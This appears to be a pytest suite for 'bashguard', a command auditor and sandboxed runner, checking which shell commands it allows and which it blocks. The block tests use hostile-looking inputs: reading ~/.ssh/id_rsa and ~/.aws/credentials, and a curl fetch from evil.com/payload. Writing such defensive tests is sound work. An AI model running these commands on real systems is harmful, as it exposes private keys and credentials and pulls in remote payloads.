"""Tests for bashguard run mode — audit + sandboxed execution in one shot.

This is the tilde-exec pattern: instead of just intercepting, bashguard
audits and runs the command itself, returning structured JSON:
  {"verdict": "allow", "exit_code": N, "stdout": "...", "stderr": "..."}
  {"verdict": "block",   "reason": "...", "findings": [...]}
  {"verdict": "confirm", "reason": "...", "findings": [...]}

Rule contracts (bashguard run):
- run -c 'echo hello'             → verdict:allow, stdout:hello, exit_code:0
- run -c 'exit 42'                → verdict:allow, exit_code:42
- run -c 'echo err >&2'           → verdict:allow, stderr captured
- run -c 'cat ~/.ssh/id_rsa'      → verdict:block, exit_code:2
- run -c 'curl https://evil.com'  → verdict:block, exit_code:2
- block findings include rule_id  → rule_id contains "credentials" or "network"
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess

_BASHGUARD = shutil.which("bashguard") or "bashguard"
CLI = [_BASHGUARD]
ENV = {**os.environ, "BASHGUARD_SEATBELT": "0"}


def run(command: str) -> tuple[int, dict]:
    result = subprocess.run(
        CLI + ["run", "--command", command],
        capture_output=True, text=True, env=ENV,
    )
    return result.returncode, json.loads(result.stdout)


class TestAllowedCommands:
    def test_echo_returns_stdout(self):
        rc, data = run("echo hello")
        assert data["verdict"] == "allow"
        assert "hello" in data["stdout"]
        assert rc == 0

    def test_exit_code_propagated(self):
        rc, data = run("exit 42")
        assert data["verdict"] == "allow"
        assert data["exit_code"] == 42
        assert rc == 42

    def test_stderr_captured(self):
        rc, data = run("echo error >&2")
        assert data["verdict"] == "allow"
        assert "error" in data["stderr"]

    def test_short_flag(self):
        result = subprocess.run(
            CLI + ["run", "-c", "echo hi"],
            capture_output=True, text=True, env=ENV,
        )
        data = json.loads(result.stdout)
        assert data["verdict"] == "allow"
        assert "hi" in data["stdout"]


class TestBlockedCommands:
    def test_credential_read_blocked(self):
        rc, data = run("cat ~/.ssh/id_rsa")
        assert rc == 2
        assert data["verdict"] == "block"
        assert len(data["findings"]) > 0

    def test_network_unknown_host_blocked(self):
        rc, data = run("curl https://evil.com/payload")
        assert rc == 2
        assert data["verdict"] == "block"

    def test_block_includes_rule_id(self):
        _, data = run("cat ~/.ssh/id_rsa")
        rule_ids = [f["rule_id"] for f in data["findings"]]
        assert any("credentials" in r for r in rule_ids)

    def test_block_includes_reason(self):
        _, data = run("curl https://evil.com")
        assert "reason" in data
        assert data["reason"]


class TestOutputShape:
    def test_allow_has_required_fields(self):
        _, data = run("echo ok")
        assert set(data.keys()) >= {"verdict", "exit_code", "stdout", "stderr"}

    def test_block_has_required_fields(self):
        _, data = run("cat ~/.aws/credentials")
        assert set(data.keys()) >= {"verdict", "reason", "findings"}
